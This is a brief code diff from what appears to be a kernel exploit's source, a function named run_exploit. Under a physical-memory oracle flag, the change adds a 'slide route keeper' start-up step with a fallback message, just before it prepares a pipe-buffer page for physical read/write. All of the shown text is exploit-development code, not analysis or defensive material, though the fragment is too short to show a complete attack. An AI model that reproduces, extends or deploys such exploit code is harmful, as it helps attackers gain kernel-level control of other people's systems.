@@ -230,6 +230,9 @@ int run_exploit(int argc, char **argv) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!slide_route_keeper_start()) {
+    pr_error("slide route keeper unavailable; fallback to direct fork\n");
+  }
   reset_pipe_attempt();
   pipebuf_page_base = prepare_pipe_buffer_page();
   pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
